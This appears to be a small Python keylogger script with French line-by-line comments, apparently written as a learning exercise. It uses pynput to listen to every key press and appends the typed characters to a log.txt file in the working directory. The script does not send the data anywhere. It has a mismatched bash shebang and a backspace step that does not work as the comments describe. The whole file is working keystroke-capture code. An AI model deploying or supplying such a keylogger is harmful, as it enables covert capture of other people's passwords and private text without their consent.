#!/bin/bash
import os  # Importe le module pour interagir avec le système d'exploitation
from pynput import keyboard  # Importe le module pour écouter les événements du clavier

# Initialiser une chaîne vide pour enregistrer les frappes
log = ""
# Définit le chemin du fichier de log dans le répertoire courant qui est log.txt sur 
log_path = os.path.join(os.getcwd(), "log.txt")

# Fonction pour traiter les touches pressées
def processkeys(key):
    global log  # Indique que nous allons utiliser la variable log définie en dehors de cette fonction
    try:
        # Vérifie si la touche pressée est un caractère sinon on passe except
        if key.char is not None:
            log += key.char  # Ajoute le caractère à la chaîne de log
    except AttributeError:
        # Gère les touches spéciales
        if key == keyboard.Key.space:
            log += " "  # Ajoute un espace pour la touche espace sS
        elif key == keyboard.Key.enter:
            log += "\n"  # Ajoute un saut de ligne pour la touche Entrée
        elif key == keyboard.Key.backspace:
            log = log[:-1]  # Supprime le dernier caractère pour la touche Retour arrière
        else:
            log += ''  # Pour les autres touches spéciales, ne fait rien

    report()  # Appelle la fonction report pour enregistrer le log

# Fonction pour enregistrer les frappes dans un fichier
def report():
    global log, log_path  # Utilise les variables log et log_path définies en dehors de cette fonction
    
    # Ouvre le fichier de log en mode ajout
    with open(log_path, "a") as logfile:
        logfile.write(log)  # Écrit le contenu de log dans le fichier
        logfile.close() # Permet de fermer le fichier une fois que les données écrites S
    log = ""  # Réinitialise la chaîne log

# Crée un écouteur de clavier qui appelle processkeys pour chaque touche pressée
keyboard_listener = keyboard.Listener(on_press=processkeys)

# Démarre l'écouteur
with keyboard_listener:
    keyboard_listener.join()  # Attend indéfiniment que l'utilisateur termine
